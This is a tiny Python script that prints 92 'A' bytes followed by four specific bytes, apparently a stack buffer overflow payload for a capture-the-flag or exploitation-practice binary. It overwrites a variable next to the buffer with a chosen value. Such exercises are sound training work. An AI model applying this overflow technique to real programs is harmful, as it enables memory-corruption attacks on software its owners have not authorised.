import sys

sys.stdout.buffer.write(b'A' * 92 + b'\x05\x03\x02\x01\n')


